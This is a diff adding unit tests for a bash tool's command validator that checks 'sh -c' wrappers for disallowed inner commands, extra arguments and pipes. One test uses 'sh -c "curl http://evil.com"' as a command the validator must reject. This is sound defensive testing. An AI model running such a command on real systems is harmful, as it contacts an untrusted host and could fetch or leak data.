@@ -64,6 +64,66 @@ class TestCommandValidation:
         assert valid is False
 
 
+class TestShellCValidation:
+    """Tests for sh -c vulnerability fixes."""
+
+    def test_sh_c_valid_command(self, bash_tool: BashTool) -> None:
+        """sh -c with allowed command should work."""
+        valid, error = bash_tool._validate_command('sh -c "echo hello"')
+        assert valid is True
+        assert error is None
+
+    def test_sh_c_disallowed_inner_command(self, bash_tool: BashTool) -> None:
+        """sh -c with disallowed command should be rejected."""
+        valid, error = bash_tool._validate_command('sh -c "curl http://evil.com"')
+        assert valid is False
+        assert "not allowed" in error.lower()
+
+    def test_sh_c_with_extra_args_rejected(self, bash_tool: BashTool) -> None:
+        """sh -c with extra arguments should be rejected (CVE fix)."""
+        # Use a clean extra arg without forbidden patterns to test the arg count check
+        valid, error = bash_tool._validate_command('sh -c "echo foo" extra_arg')
+        assert valid is False
+        assert "no extra arguments" in error.lower()
+
+    def test_sh_c_with_multiple_extra_args(self, bash_tool: BashTool) -> None:
+        """sh -c with multiple extra args should be rejected."""
+        valid, error = bash_tool._validate_command('sh -c "echo" arg1 arg2 arg3')
+        assert valid is False
+        assert "no extra arguments" in error.lower()
+
+    def test_sh_without_c_flag_rejected(self, bash_tool: BashTool) -> None:
+        """sh without -c flag should be rejected."""
+        valid, error = bash_tool._validate_command("sh script.sh")
+        assert valid is False
+        assert "only allowed" in error.lower()
+
+    def test_sh_alone_rejected(self, bash_tool: BashTool) -> None:
+        """sh alone should be rejected."""
+        valid, error = bash_tool._validate_command("sh")
+        assert valid is False
+        assert "only allowed" in error.lower()
+
+    def test_sh_c_empty_inner_command(self, bash_tool: BashTool) -> None:
+        """sh -c with empty inner command should be rejected."""
+        valid, error = bash_tool._validate_command('sh -c ""')
+        assert valid is False
+        assert "empty" in error.lower()
+
+    def test_sh_c_unparseable_rejected(self, bash_tool: BashTool) -> None:
+        """sh -c with unparseable inner command should be rejected (fail-closed)."""
+        # Inner command has unterminated quote, but outer is parseable
+        valid, error = bash_tool._validate_command("sh -c \"echo 'unterminated\"")
+        assert valid is False
+        assert "cannot parse" in error.lower()
+
+    def test_sh_c_forbidden_pattern_in_inner(self, bash_tool: BashTool) -> None:
+        """sh -c should reject forbidden patterns in inner command."""
+        valid, error = bash_tool._validate_command('sh -c "cat file | grep foo"')
+        assert valid is False
+        assert "not allowed" in error.lower()
+
+
 class TestAllowlist:
     def test_common_commands_allowed(self) -> None:
         expected = ["ls", "cat", "grep", "find", "mkdir", "rm", "cp", "mv", "echo"]
